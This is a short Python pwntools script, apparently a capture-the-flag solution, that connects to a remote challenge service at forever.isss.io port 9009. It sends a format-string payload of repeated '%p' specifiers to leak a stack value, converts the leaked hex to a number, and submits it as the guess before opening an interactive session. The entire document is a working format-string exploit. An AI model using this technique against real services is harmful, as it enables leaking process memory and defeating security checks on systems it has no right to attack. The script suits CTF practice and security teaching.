from pwn import *

#p = process("./leak")
#gdb.attach(p)
p = remote("forever.isss.io", 9009)

p.recvuntil(b"Try to guess it!")
p.sendline(b"%p"*7)
p.recvuntil(b"You inputted:")
p.recvline()
leak = p.recvline().strip()[-18:-8]
log.success(leak)

p.recvuntil(b"You can have one more try.")
p.sendline(str(int(leak, 16)).encode())

p.interactive()
